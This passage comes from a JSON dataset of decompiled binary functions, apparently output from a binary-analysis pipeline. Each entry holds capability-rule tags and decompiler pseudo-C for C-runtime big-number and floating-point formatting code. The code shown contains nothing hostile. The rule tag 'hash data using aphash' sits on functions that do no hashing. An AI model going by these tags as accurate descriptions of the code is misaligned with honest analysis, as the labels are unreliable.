(var_91ch <= var_914h) {\n                var_924h = &var_740h;\n            }\n            var_92ch = &var_740h;\n            puVar14 = var_91ch;\n            var_934h = var_914h;\n            if (var_91ch <= var_914h) {\n                var_92ch = &var_910h;\n                puVar14 = var_914h;\n                var_934h = var_91ch;\n            }\n            var_744h = NULL;\n            puVar11 = NULL;\n            var_574h = NULL;\n            if (var_934h != NULL) {\n                do {\n                    if (var_924h[puVar11] == 0) {\n                        if (puVar11 == var_744h) {\n                            (&var_570h)[puVar11] = 0;\n                            var_744h = puVar11 + 1;\n                            var_574h = var_744h;\n                        }\n                    }\n                    else {\n                        uVar10 = 0;\n                        var_938h = NULL;\n                        puVar12 = puVar11;\n                        if (puVar14 != NULL) {\n                            do {\n                                if (puVar12 == 0x73) break;\n                                if (puVar12 == var_744h) {\n                                    (&var_570h)[puVar12] = 0;\n                                    var_574h = puVar11 + 1 + var_938h;\n                                }\n                                uVar13 = var_92ch[var_938h];\n                                uVar3 = var_924h[puVar11];\n                                uVar5 = uVar13 * uVar3;\n                                uVar6 = uVar5 + uVar10;\n                                puVar8 = &var_570h + puVar12;\n                                uVar4 = *puVar8;\n                                *puVar8 = *puVar8 + uVar6;\n                                uVar10 = (uVar13 * uVar3 >> 0x20) + CARRY4(uVar5, uVar10) + CARRY4(uVar4, uVar6);\n                                var_938h = var_938h + 1;\n                                puVar12 = puVar12 + 1;\n                                var_744h = var_574h;\n                            } while (var_938h != puVar14);\n                            do {\n                                if (uVar10 == 0) break;\n                                if (puVar12 == 0x73) goto code_r0x004b7461;\n                                if (puVar12 == var_744h) {\n                                    (&var_570h)[puVar12] = 0;\n                                    var_574h = puVar12 + 1;\n                                }\n                                puVar8 = &var_570h + puVar12;\n                                uVar13 = *puVar8;\n                                *puVar8 = *puVar8 + uVar10;\n                                uVar10 = CARRY4(uVar13, uVar10);\n                                puVar12 = puVar12 + 1;\n                                var_744h = var_574h;\n                            } while( true );\n                        }\n                        if (puVar12 == 0x73) {\ncode_r0x004b7461:\n                            var_b2ch = NULL;\n                            var_744h = NULL;\n                            fcn.004b9f7c(&var_740h, 0x1cc, &var_b28h, 0);\n                            bVar16 = false;\n                            goto code_r0x004b73cd;\n                        }\n                    }\n                    puVar11 = puVar11 + 1;\n                } while (puVar11 != var_934h);\n            }\n            fcn.004b9f7c(&var_740h, 0x1cc, &var_570h, var_744h << 2);\n            bVar16 = true;\ncode_r0x004b73cd:\n            var_91ch = var_744h;\n        }\ncode_r0x004b73d9:\n        if (!bVar16) goto code_r0x004b7518;\n        puVar14 = var_3a4h;\n    }\n    if (var_940h != NULL) {\n        puVar11 = *(var_940h * 4 + 0x5520cc);\n        var_940h = puVar11;\n        if (puVar11 == NULL) {\n            var_744h = puVar11;\n            fcn.004b9f7c(&var_740h, 0x1cc, &var_b28h, 0);\n            puVar14 = var_3a4h;\n            var_b2ch = puVar11;\ncode_r0x004b7450:\n            var_91ch = var_744h;\n        }\n        else if ((puVar11 != 0x1) && (var_91ch != NULL)) {\n            uVar10 = 0;\n            puVar12 = NULL;\n            do {\n                uVar13 = (&var_740h)[puVar12];\n                uVar3 = ZEXT48(puVar11) * uVar13;\n                (&var_740h)[puVar12] = uVar3 + uVar10;\n                uVar10 = (ZEXT48(puVar11) * uVar13 >> 0x20) + CARRY4(uVar3, uVar10);\n                puVar12 = puVar12 + 1;\n            } while (puVar12 != var_91ch);\n            if (uVar10 == 0) goto code_r0x004b7450;\n            if (0x72 < var_744h) {\ncode_r0x004b7518:\n                var_744h = NULL;\n                fcn.004b9f7c(&var_740h, 0x1cc, &var_b28h, 0);\n                fcn.004061e0(*(var_948h + 0xc2), var_950h);\n                goto code_r0x004b69a9;\n            }\n            (&var_740h)[var_744h] = uVar10;\n            var_91ch = var_744h + 1;\n            var_744h = var_91ch;\n        }\n    }\n    if (puVar14 == NULL) {\n        uVar10 = 0;\n    }\n    else {\n        uVar10 = (&var_3a4h)[puVar14];\n        var_944h = 0;\n        iVar19 = 0x1f;\n        if (uVar10 != 0) {\n            for (; uVar10 >> iVar19 == 0; iVar19 = iVar19 + -1) {\n            }\n        }\n        if (uVar10 == 0) {\n            iVar19 = 0;\n        }\n        else {\n            iVar19 = iVar19 + 1;\n        }\n        uVar10 = (puVar14 + -1) * 0x20 + iVar19;\n    }\n    if (var_91ch == NULL) {\n        uVar13 = 0;\n    }\n    else {\n        uVar13 = (&var_744h)[var_91ch];\n        var_944h = 0;\n        iVar19 = 0x1f;\n        if (uVar13 != 0) {\n            for (; uVar13 >> iVar19 == 0; iVar19 = iVar19 + -1) {\n            }\n        }\n        if (uVar13 == 0) {\n            iVar19 = 0;\n        }\n        else {\n            iVar19 = iVar19 + 1;\n        }\n        uVar13 = (var_91ch + -1) * 0x20 + iVar19;\n    }\n    var_920h = -(uVar10 < uVar13) & uVar13 - uVar10;\n    puVar11 = var_91ch;\n    if (var_920h != NULL) {\n        puVar11 = var_920h & 0x1f;\n        uVar13 = var_920h >> 5;\n        var_930h = 0x20 - puVar11;\n        var_944h = uVar13;\n        var_940h = puVar11;\n        iVar19 = fcn.004040a7();\n        uVar10 = (&var_3a4h)[puVar14];\n        var_924h = iVar19 + -1;\n        iVar19 = 0x1f;\n        if (uVar10 != 0) {\n            for (; uVar10 >> iVar19 == 0; iVar19 = iVar19 + -1) {\n            }\n        }\n        var_934h = ~var_924h;\n        var_95ch = NULL;\n        if (uVar10 == 0) {\n            iVar19 = 0;\n        }\n        else {\n            iVar19 = iVar19 + 1;\n        }\n        if ((uVar13 + puVar14 < 0x74) && (var_95ch = (0x20 - iVar19 < puVar11) + uVar13 + puVar14,  var_95ch < 0x74)) {\n            var_928h = uVar13 - 1;\n            var_938h = var_95ch + -1;\n            if (var_938h != var_928h) {\n                puVar12 = var_938h - uVar13;\n                puVar11 = &var_3a4h + puVar12;\n                do {\n                    if (puVar12 < puVar14) {\n                        var_92ch = puVar11[1];\n                    }\n                    else {\n                        var_92ch = NULL;\n                    }\n                    if (puVar12 - 1U < puVar14) {\n                        uVar10 = *puVar11;\n                    }\n                    else {\n                        uVar10 = 0;\n                    }\n                    puVar11 = puVar11 + -1;\n                    (&var_3a0h)[var_938h] =\n                         (uVar10 & var_934h) >> (var_930h & 0x1f) | (var_92ch & var_924h) << (var_940h & 0x1f);\n                    var_938h = var_938h + -1;\n                    puVar12 = puVar12 + -1;\n                    puVar14 = var_3a4h;\n                    uVar13 = var_944h;\n                } while (var_938h != var_928h);\n            }\n            if (uVar13 != 0) {\n                puVar15 = &var_3a0h;\n                for (; uVar13 != 0; uVar13 = uVar13 - 1) {\n                    *puVar15 = 0;\n                    puVar15 = puVar15 + 1;\n                }\n            }\n            var_3a4h = var_95ch;\n            puVar11 = var_91ch;\n            puVar14 = var_3a4h;\n        }\n        else {\n            var_3a4h = NULL;\n            var_b2ch = NULL;\n            fcn.004b9f7c(&var_3a0h, 0x1cc, &var_b28h, 0);\n            puVar11 = var_744h;\n            puVar14 = var_3a4h;\n        }\n    }\n    var_94ch = var_94ch - var_93ch;\n    puVar12 = var_94ch;\n    if (var_93ch != NULL) {\n        if (var_94ch < var_920h) {\n            bVar16 = var_958h != var_954h;\n            uVar2 = *(var_948h + 0xc2);\n            goto code_r0x004b7a4e;\n        }\n        puVar12 = var_94ch - var_920h;\n    }\n    if (puVar14 <= puVar11) {\n        if (puVar14 < puVar11) {\ncode_r0x004b77cb:\n            var_920h = var_920h + 1;\n        }\n        else {\n            puVar7 = puVar14 + -1;\n            if (puVar7 != 0xffffffff) {\n                do {\n                    if ((&var_3a0h)[puVar7] != (&var_740h)[puVar7]) break;\n                    puVar7 = puVar7 + -1;\n                } while (puVar7 != 0xffffffff);\n                if ((puVar7 != 0xffffffff) &&\n                   ((&var_3a0h)[puVar7] < (&var_740h)[puVar7] || (&var_3a0h)[puVar7] == (&var_740h)[puVar7]))\n                goto code_r0x004b77cb;\n            }\n        }\n    }\n    puVar11 = puVar12 & 0x1f;\n    uVar13 = puVar12 >> 5;\n    var_95ch = 0x20 - puVar11;\n    var_934h = puVar11;\n    iVar19 = fcn.004040a7();\n    uVar10 = (&var_3a4h)[puVar14];\n    var_940h = iVar19 + -1;\n    iVar19 = 0x1f;\n    if (uVar10 != 0) {\n        for (; uVar10 >> iVar19 == 0; iVar19 = iVar19 + -1) {\n        }\n    }\n    var_944h = ~var_940h;\n    var_92ch = NULL;\n    if (uVar10 == 0) {\n        iVar19 = 0;\n    }\n    else {\n        iVar19 = iVar19 + 1;\n    }\n    if ((uVar13 + puVar14 < 0x74) && (var_930h = (0x20 - iVar19 < puVar11) + uVar13 + puVar14,  var_930h < 0x74)) {\n        var_938h = var_930h + -1;\n        if (var_938h != uVar13 - 1) {\n            puVar12 = var_938h - uVar13;\n            puVar11 = &var_3a4h + puVar12;\n            do {\n                if (puVar12 < puVar14) {\n                    var_92ch = puVar11[1];\n                }\n                else {\n                    var_92ch = NULL;\n                }\n                if (puVar12 - 1U < puVar14) {\n                    uVar10 = *puVar11;\n                }\n                else {\n                    uVar10 = 0;\n                }\n                puVar11 = puVar11 + -1;\n                (&var_3a0h)[var_938h] =\n                     (uVar10 & var_944h) >> (var_95ch & 0x1f) | (var_92ch & var_940h) << (var_934h & 0x1f);\n                var_938h = var_938h + -1;\n                puVar12 = puVar12 + -1;\n                puVar14 = var_3a4h;\n            } while (var_938h != uVar13 - 1);\n        }\n        var_3a4h = var_930h;\n        if (uVar13 != 0) {\n            puVar15 = &var_3a0h;\n            for (; uVar13 != 0; uVar13 = uVar13 - 1) {\n                *puVar15 = 0;\n                puVar15 = puVar15 + 1;\n            }\n        }\n    }\n    else {\n        var_3a4h = NULL;\n        var_b2ch = NULL;\n        fcn.004b9f7c(&var_3a0h, 0x1cc, &var_b28h, 0);\n    }\n    uVar17 = fcn.00404755(&var_3a4h, &var_744h);\n    uVar13 = uVar17 >> 0x20;\n    uVar10 = uVar17;\n    var_924h = var_924h & 0xffffff00 | var_3a4h == NULL;\n    if (uVar13 == 0) {\n        iVar19 = 0x1f;\n        if (uVar10 != 0) {\n            for (; uVar10 >> iVar19 == 0; iVar19 = iVar19 + -1) {\n            }\n        }\n        if (uVar10 == 0) {\n            puVar14 = NULL;\n        }\n        else {\n            puVar14 = iVar19 + 1;\n        }\n    }\n    else {\n        iVar19 = 0x1f;\n        if (uVar13 != 0) {\n            for (; uVar13 >> iVar19 == 0; iVar19 = iVar19 + -1) {\n            }\n        }\n        if (uVar13 == 0) {\n            iVar19 = 0;\n        }\n        else {\n            iVar19 = iVar19 + 1;\n        }\n        puVar14 = iVar19 + 0x20;\n    }\n    if (var_94ch < puVar14) {\n        if (var_3a4h == NULL) {\n            iVar18 = fcn.004040a7();\n            var_924h = CONCAT31(var_924h._1_3_, 1);\n            if ((iVar18 - 1U & uVar17) != 0) goto code_r0x004b799b;\n        }\n        else {\ncode_r0x004b799b:\n            var_924h = var_924h & 0xffffff00;\n        }\n        uVar17 = fcn.00401b90();\n    }\n    iVar18 = fcn.004040a7();\n    if (var_93ch == NULL) {\n        puVar7 = ~var_920h;\n    }\n    else {\n        puVar7 = var_93ch + -2;\n    }\n    fcn.004067da(uVar17 + iVar18, uVar17 + iVar18 >> 0x20, puVar7, *(var_948h + 0xc2), var_924h, var_950h);\ncode_r0x004b7a5d:\n    fcn.00403085(var_b2ch);\n    return;\n}\n",
        "token_count": 15460
    },
    "0040480e": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuint32_t fcn.0040480e(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t in_MXCSR;\n    uint16_t in_FPUStatusWord;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = in_FPUStatusWord & 0x3f;\n    uVar1 = (uVar1 >> 1 & 1) << 5 | (uVar1 >> 2 & 1) << 3 | (uVar1 >> 3 & 1) << 2 | (uVar1 >> 4 & 1) * 2 |\n            (in_FPUStatusWord & 1) << 4 | uVar1 >> 5;\n    if (*0x56ec4c < 1) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = in_MXCSR & 0x3f;\n    }\n    uVar2 = (uVar2 >> 1 & 1) << 5 | (uVar2 >> 2 & 1) << 3 | (uVar2 >> 3 & 1) << 2 | (uVar2 >> 4 & 1) * 2 |\n            (uVar2 & 1) << 4 | uVar2 >> 5;\n    return (uVar2 << 8 | uVar1) << 0x10 | uVar2 | uVar1;\n}\n",
        "token_count": 327
    },
    "004054e3": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_964h\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.004054e3(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint *arg_14h, uint *arg_18h, int32_t arg_1ch)\n\n{\n    char **ppcVar1;\n    uint64_t uVar2;\n    code *pcVar3;\n    bool bVar4;\n    char cVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uchar *puVar9;\n    char *pcVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t *puVar13;\n    uint *puVar14;\n    uint *puVar15;\n    uint32_t *puVar16;\n    uint *puVar17;\n    uint32_t uVar18;\n    uint32_t *puVar19;\n    uint *puVar20;\n    char *pcVar21;\n    bool bVar22;\n    uint *var_964h;\n    uint var_960h;\n    uint32_t var_794h;\n    uint var_790h;\n    uint var_788h;\n    uint *var_784h;\n    uint *var_77ch;\n    uint32_t var_778h;\n    uint *var_774h;\n    uint *var_770h;\n    uint32_t var_76ch;\n    uint32_t *var_768h;\n    uint *var_764h;\n    uint32_t *var_760h;\n    uint32_t var_75ch;\n    uint32_t var_758h;\n    uint *var_754h;\n    uint *var_750h;\n    uint *var_74ch;\n    uint *var_748h;\n    uint *var_744h;\n    uint var_740h;\n    uint *var_574h;\n    uint32_t var_570h;\n    uint var_56ch;\n    uint *var_3a4h;\n    uint *var_3a0h;\n    char *apcStack928 [114];\n    uint32_t *var_1d4h;\n    uint *var_1d0h;\n    uint32_t var_1cch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_784h = arg_14h;\n    var_764h = arg_18h;\n    fcn.004030c6(&var_790h);\n    var_788h._0_1_ = (var_790h & 0x1f) != 0x1f;\n    if (var_788h) {\n        fcn.004059d4(&var_790h);\n    }\n    uVar12 = arg_ch;\n    uVar6 = 0x20;\n    if ((arg_ch < 1) && (arg_ch < 0)) {\n        uVar6 = 0x2d;\n    }\n    *var_784h = uVar6;\n    var_784h[2] = var_764h;\n    fcn.00405a7e(&var_794h, 0, 0);\n    if (((uVar12 & 0x7ff00000) == 0) && (((arg_8h | uVar12 & 0xfffff) == 0 || ((var_794h & 0x1000000) != 0)))) {\n        pcVar21 = 0x554aec;\n        var_784h[1] = 0;\n        goto code_r0x004d8b17;\n    }\n    iVar7 = fcn.00404444(&arg_8h);\n    if (iVar7 != 0) {\n        var_784h[1] = 1;\n    }\n    if (iVar7 == 1) {\n        iVar7 = fcn.00405f56(var_764h, arg_1ch, \"1#INF\");\n    }\n    else {\n        if (iVar7 == 2) {\n            pcVar21 = \"1#QNAN\";\n        }\n        else if (iVar7 == 3) {\n            pcVar21 = \"1#SNAN\";\n        }\n        else {\n            if (iVar7 != 4) {\n                arg_ch = uVar12 & 0x7fffffff;\n                var_77ch = NULL;\n                var_778h = arg_10h + 1;\n                _var_75ch = CONCAT44(uVar12, arg_8h) & 0x7fffffffffffffff;\n                var_758h = _var_75ch >> 0x20;\n                uVar12 = var_758h >> 0x14;\n                if (uVar12 != 0) {\n                    uVar18 = 0;\n                    iVar7 = 0x100000;\n                }\n                else {\n                    iVar7 = 0;\n                    uVar18 = uVar12;\n                }\n                var_750h = uVar12 == 0;\n                var_774h = var_75ch + uVar18;\n                var_1cch = (var_758h & 0xfffff) + iVar7 + CARRY4(var_75ch, uVar18);\n                var_748h = var_750h + uVar12;\n                fcn.00405259();\n                fcn.00406208();\n                var_76ch = fcn.00401d39();\n                if ((var_76ch == 0x7fffffff) || (var_76ch == 0x80000000)) {\n                    var_76ch = 0;\n                }\n                var_1d0h = var_774h;\n                var_760h = (var_1cch != 0) + 1;\n                var_1d4h = var_760h;\n                if (var_748h < 0x433) {\n                    if (var_748h == 0x35) {\ncode_r0x004d9114:\n                        _var_75ch = _var_75ch & 0xffffffff;\n                        uVar12 = (&var_1d0h)[var_1cch != 0];\n                        iVar7 = 0x1f;\n                        if (uVar12 != 0) {\n                            for (; uVar12 >> iVar7 == 0; iVar7 = iVar7 + -1) {\n                            }\n                        }\n                        if (uVar12 == 0) {\n                            iVar7 = 0;\n                        }\n                        else {\n                            iVar7 = iVar7 + 1;\n                        }\n                        puVar15 = (iVar7 == 0x20) + var_760h;\n                        if (puVar15 < 0x74) {\n                            puVar16 = puVar15 + -1;\n                            if (puVar16 != 0xffffffff) {\n                                puVar19 = puVar15 + -2;\n                                puVar13 = var_760h;\n                                do {\n                                    if (puVar16 < puVar13) {\n                                        iVar7 = (&var_1d0h)[puVar16];\n                                    }\n                                    else {\n                                        iVar7 = 0;\n                                    }\n                                    if (puVar19 < puVar13) {\n                                        uVar12 = (&var_1d4h)[puVar16];\n                                    }\n                                    else {\n                                        uVar12 = 0;\n                                    }\n                                    (&var_1d0h)[puVar16] = uVar12 >> 0x1f | iVar7 * 2;\n                                    puVar16 = puVar16 + -1;\n                                    puVar19 = puVar19 + -1;\n                                    puVar13 = var_1d4h;\n                                } while (puVar16 != 0xffffffff);\n                            }\n                        }\n                        else {\n                            var_574h = NULL;\n                            var_1d4h = NULL;\n                            fcn.004da487(&var_1d0h, 0x1cc, &var_570h, 0);\n                            puVar15 = var_1d4h;\n                        }\n                        var_1d4h = puVar15;\n                        uVar12 = 0x434 - var_748h;\n                        uVar18 = uVar12 >> 5;\n                        fcn.0040314d(&var_570h);\n                        (&var_570h)[uVar18] = 1 << (uVar12 & 0x1f);\n                    }\n                    else {\n                        var_570h = 0;\n                        var_56ch = 0x100000;\n                        var_574h = 0x2;\n                        if (var_1cch == 0) goto code_r0x004d9114;\n                        iVar7 = 0;\n                        do {\n                            if (*(&var_570h + iVar7) != *(&var_1d0h + iVar7)) goto code_r0x004d9114;\n                            iVar7 = iVar7 + 4;\n                        } while (iVar7 != 8);\n                        iVar7 = 0x1f;\n                        if (var_1cch != 0) {\n                            for (; var_1cch >> iVar7 == 0; iVar7 = iVar7 + -1) {\n                            }\n                        }\n                        _var_75ch = _var_75ch & 0xffffffff;\n                        if (var_1cch == 0) {\n                            iVar7 = 0;\n                        }\n                        else {\n                            iVar7 = iVar7 + 1;\n                        }\n                        puVar15 = (0x20U - iVar7 < 2) + var_760h;\n                        if (puVar15 < 0x74) {\n                            puVar16 = puVar15 + -1;\n                            if (puVar16 != 0xffffffff) {\n                                puVar19 = puVar15 + -2;\n                                puVar13 = var_760h;\n                                do {\n                                    if (puVar16 < puVar13) {\n                                        iVar7 = (&var_1d0h)[puVar16];\n                                    }\n                                    else {\n                                        iVar7 = 0;\n                                    }\n                                    if (puVar19 < puVar13) {\n                                        uVar12 = (&var_1d4h)[puVar16];\n                                    }\n                                    else {\n                                        uVar12 = 0;\n                                    }\n                                    (&var_1d0h)[puVar16] = uVar12 >> 0x1e | iVar7 << 2;\n                                    puVar16 = puVar16 + -1;\n                                    puVar19 = puVar19 + -1;\n                                    puVar13 = var_1d4h;\n                                } while (puVar16 != 0xffffffff);\n                            }\n                        }\n                        else {\n                            var_574h = NULL;\n                            var_1d4h = NULL;\n                            fcn.004da487(&var_1d0h, 0x1cc, &var_570h, 0);\n                            puVar15 = var_1d4h;\n                        }\n                        var_1d4h = puVar15;\n                        uVar12 = 0x435 - var_748h;\n                        uVar18 = uVar12 >> 5;\n                        fcn.0040314d(&var_570h);\n                        (&var_570h)[uVar18] = 1 << (uVar12 & 0x1f);\n                    }\n                    var_574h = uVar18 + 1;\n                    var_3a4h = var_574h;\n                    fcn.004da487(&var_3a0h, 0x1cc, &var_570h, var_574h * 4);\n                }\n                else {\n                    var_570h = 0;\n                    var_56ch = 0x100000;\n                    var_574h = 0x2;\n                    if (var_1cch == 0) {\ncode_r0x004d8e5f:\n                        var_750h = var_748h + -0x432 & 0x1f;\n                        var_768h = var_748h + -0x432 >> 5;\n                        var_77ch = 0x20 - var_750h;\n                        iVar7 = fcn.004040a7();\n                        var_774h = iVar7 - 1;\n                        var_74ch = NULL;\n                        _var_75ch = _var_75ch & 0xffffffff | ~var_774h << 0x20;\n                        uVar12 = (&var_1d4h)[var_760h];\n                        iVar7 = 0x1f;\n                        if (uVar12 != 0) {\n                            for (; uVar12 >> iVar7 == 0; iVar7 = iVar7 + -1) {\n                            }\n                        }\n                        if (uVar12 == 0) {\n                            var_754h = NULL;\n                        }\n                        else {\n                            var_754h = iVar7 + 1;\n                        }\n                        if ((var_760h + var_768h < 0x74) &&\n                           (var_770h = (0x20 - var_754h < var_750h) + var_760h + var_768h,  var_770h < 0x74)) {\n                            var_74ch = var_768h + -1;\n                            var_748h = var_770h + -1;\n                            puVar16 = var_760h;\n                            if (var_748h != var_74ch) {\n                                puVar19 = var_748h - var_768h;\n                                puVar16 = &var_1d4h + puVar19;\n                                do {\n                                    if (puVar19 < var_760h) {\n                                        var_754h = puVar16[1];\n                                    }\n                                    else {\n                                        var_754h = NULL;\n                                    }\n                                    if (puVar19 + -1 < var_760h) {\n                                        uVar12 = *puVar16;\n                                    }\n                                    else {\n                                        uVar12 = 0;\n                                    }\n                                    (&var_1d0h)[var_748h] =\n                                         (uVar12 & ~var_774h) >> (var_77ch & 0x1f) |\n                                         (var_754h & var_774h) << (var_750h & 0x1f);\n                                    var_748h = var_748h + -1;\n                                    puVar16 = puVar16 + -1;\n                                    puVar19 = puVar19 + -1;\n                                    var_760h = var_1d4h;\n                                } while (var_748h != var_74ch);\n                            }\n                            var_760h = puVar16;\n                            var_1d4h = var_770h;\n                            if (var_768h != NULL) {\n                                puVar15 = &var_1d0h;\n                                for (puVar16 = var_768h; puVar16 != NULL; puVar16 = puVar16 + -1) {\n                                    *puVar15 = 0;\n                                    puVar15 = puVar15 + 1;\n                                }\n                            }\n                        }\n                        else {\n                            var_574h = NULL;\n                            var_1d4h = NULL;\n                            fcn.004da487(&var_1d0h, 0x1cc, &var_570h, 0);\n                        }\n                        var_570h = 2;\n                    }\n                    else {\n                        iVar7 = 0;\n                        do {\n                            if (*(&var_570h + iVar7) != *(&var_1d0h + iVar7)) goto code_r0x004d8e5f;\n                            iVar7 = iVar7 + 4;\n                        } while (iVar7 != 8);\n                        var_768h = var_748h + -0x431 & 0x1f;\n                        var_754h = var_748h + -0x431 >> 5;\n                        var_74ch = 0x20 - var_768h;\n                        iVar7 = fcn.004040a7();\n                        var_770h = iVar7 + -1;\n                        _var_75ch = _var_75ch & 0xffffffff;\n                        var_774h = ~var_770h;\n                        uVar12 = (&var_1d4h)[var_760h];\n                        iVar7 = 0x1f;\n                        if (uVar12 != 0) {\n                            for (; uVar12 >> iVar7 == 0; iVar7 = iVar7 + -1) {\n                            }\n                        }\n                        if (uVar12 == 0) {\n                            var_750h = NULL;\n                        }\n                        else {\n                            var_750h = iVar7 + 1;\n                        }\n                        if (var_760h + var_754h < 0x74) {\n                            puVar15 = (0x20 - var_750h < var_768h) + var_760h + var_754h;\n                            _var_75ch = _var_75ch | ZEXT48(puVar15) << 0x20;\n                            if (0x73 < puVar15) goto code_r0x004d8d19;\n                            var_77ch = var_754h + -1;\n                            var_748h = puVar15 + -1;\n                            puVar16 = var_760h;\n                            if (var_748h != var_77ch) {\n                                puVar19 = var_748h - var_754h;\n                                puVar16 = &var_1d4h + puVar19;\n                                do {\n                                    if (puVar19 < var_760h) {\n                                        var_750h = puVar16[1];\n                                    }\n                                    else {\n                                        var_750h = NULL;\n                                    }\n                                    if (puVar19 + -1 < var_760h) {\n                                        uVar12 = *puVar16;\n                                    }\n                                    else {\n                                        uVar12 = 0;\n                                    }\n                                    (&var_1d0h)[var_748h] =\n                                         (uVar12 & var_774h) >> (var_74ch & 0x1f) |\n                                         (var_750h & var_770h) << (var_768h & 0x1f);\n                                    var_748h = var_748h + -1;\n                                    puVar16 = puVar16 + -1;\n                                    puVar19 = puVar19 + -1;\n                                    var_760h = var_1d4h;\n                                } while (var_748h != var_77ch);\n                            }\n                            var_760h = puVar16;\n                            var_1d4h = puVar15;\n                            if (var_754h != NULL) {\n                                puVar20 = &var_1d0h;\n                                for (puVar15 = var_754h; puVar15 != NULL; puVar15 = puVar15 + -1) {\n                                    *puVar20 = 0;\n                                    puVar20 = puVar20 + 1;\n                                }\n                            }\n                        }\n                        else {\ncode_r0x004d8d19:\n                            var_574h = NULL;\n                            var_1d4h = NULL;\n                            fcn.004da487(&var_1d0h, 0x1cc, &var_570h, 0);\n                        }\n                        var_570h = 4;\n                    }\n                    var_56ch = 0;\n                    var_3a4h = 0x1;\n                    var_574h = 0x1;\n                    fcn.004da487(&var_3a0h, 0x1cc, &var_570h, 4);\n                }\n                bVar22 = true;\n                var_774h = 0xa;\n                if (var_76ch < 0) {\n                    var_77ch = -var_76ch % 10;\n                    for (var_760h = -var_76ch / 10; var_760h != NULL; var_760h = var_760h - var_768h) {\n                        var_768h = var_760h;\n                        if (0x26 < var_760h) {\n                            var_768h = 0x26;\n                        }\n                        uVar12 = *(var_768h * 4 + 0x552016);\n                        uVar18 = *(var_768h * 4 + 0x552017);\n                        var_574h = uVar12 + uVar18;\n                        fcn.0040314d(&var_570h);\n                        fcn.0040576d(&var_570h + uVar12, *(var_768h * 4 + 0x552014) * 4 + 0x551540, uVar18 << 2);\n                        if (var_574h < 0x2) {\n                            if (var_570h == 0) {\n                                var_964h = NULL;\n                                var_1d4h = NULL;\n                                fcn.004da487(&var_1d0h, 0x1cc, &var_960h, 0);\n                            }\n                            else if ((var_570h != 1) && (var_1d4h != NULL)) {\n                                uVar12 = 0;\n                                _var_75ch = _var_75ch & 0xffffffff | ZEXT48(var_1d4h) << 0x20;\n                                puVar15 = NULL;\n                                do {\n                                    uVar18 = (&var_1d0h)[puVar15];\n                                    uVar11 = var_570h * uVar18;\n                                    (&var_1d0h)[puVar15] = uVar11 + uVar12;\n                                    uVar12 = (var_570h * uVar18 >> 0x20) + CARRY4(uVar11, uVar12);\n                                    puVar15 = puVar15 + 1;\n                                } while (puVar15 != var_1d4h);\n                                if (uVar12 == 0) goto code_r0x004d97e3;\n                                if (var_1d4h < 0x73) {\n                                    (&var_1d0h)[var_1d4h] = uVar12;\n                                    var_1d4h = var_1d4h + 1;\n                                    goto code_r0x004d97e3;\n                                }\n                                var_964h = NULL;\n                                var_1d4h = NULL;\n                                fcn.004da487(&var_1d0h, 0x1cc, &var_960h, 0);\n                                bVar4 = false;\n                                goto code_r0x004d9adb;\n                            }\ncode_r0x004d97e3:\n                            bVar4 = true;\n                        }\n                        else {\n                            if (var_1d4h < 0x2) {\n                                var_74ch = var_1d0h;\n                                var_1d4h = var_574h;\n                                fcn.004da487(&var_1d0h, 0x1cc, &var_570h, var_574h << 2);\n                                if (var_74ch == NULL) {\n                                    var_964h = var_74ch;\n                                    var_1d4h = var_74ch;\n                                    puVar15 = &var_960h;\n                                    puVar20 = var_74ch;\n                                    goto code_r0x004d9ac8;\n                                }\n                                if ((var_74ch != 0x1) && (var_1d4h != NULL)) {\n                                    _var_75ch = _var_75ch & 0xffffffff | ZEXT48(var_1d4h) << 0x20;\n                                    uVar12 = 0;\n                                    puVar15 = NULL;\n                                    do {\n                                        uVar18 = (&var_1d0h)[puVar15];\n                                        uVar11 = ZEXT48(var_74ch) * uVar18;\n                                        (&var_1d0h)[puVar15] = uVar11 + uVar12;\n                                        uVar12 = (ZEXT48(var_74ch) * uVar18 >> 0x20) + CARRY4(uVar11, uVar12);\n                                        puVar15 = puVar15 + 1;\n                                    } while (puVar15 != var_1d4h);\n                                    if (uVar12 != 0) {\n                                        if (0x72 < var_1d4h) {\ncode_r0x004d9b8c:\n                                            var_964h = NULL;\n                                            var_1d4h = NULL;\n                                            fcn.004da487(&var_1d0h, 0x1cc, &var_960h, 0);\n                                            bVar4 = false;\n                                            goto code_r0x004d9adb;\n                                        }\n                                        (&var_1d0h)[var_1d4h] = uVar12;\n                                        var_1d4h = var_1d4h + 1;\n                                    }\n                                }\n                            }\n                            else {\n                                var_750h = &var_570h;\n                                if (var_1d4h <= var_574h) {\n                                    var_750h = &var_1d0h;\n                                }\n                                var_74ch = &var_1d0h;\n                                puVar15 = var_1d4h;\n                                var_754h = var_574h;\n                                if (var_1d4h <= var_574h) {\n                                    var_74ch = &var_570h;\n                                    puVar15 = var_574h;\n                                    var_754h = var_1d4h;\n                                }\n                                var_1d4h = NULL;\n                                puVar20 = NULL;\n                                var_744h = NULL;\n                                if (var_754h != NULL) {\n                                    do {\n                                        if (var_750h[puVar20] == 0) {\n                                            if (puVar20 == var_1d4h) {\n                                                (&var_740h)[puVar20] = 0;\n                                                var_1d4h = puVar20 + 1;\n                                                var_744h = var_1d4h;\n                                            }\n                                        }\n                                        else {\n                                            var_748h = NULL;\n                                            var_770h = NULL;\n                                            puVar14 = puVar20;\n                                            if (puVar15 != NULL) {\n                                                do {\n                                                    puVar17 = var_770h;\n                                                    if (puVar14 == 0x73) break;\n                                                    if (puVar14 == var_1d4h) {\n                                                        (&var_740h)[puVar14] = 0;\n                                                        var_744h = var_748h + 1 + puVar20;\n                                                    }\n                                                    uVar12 = var_74ch[var_748h];\n                                                    uVar18 = var_750h[puVar20];\n                                                    uVar11 = uVar12 * uVar18;\n                                                    pcVar10 = uVar11 + var_770h;\n                                                    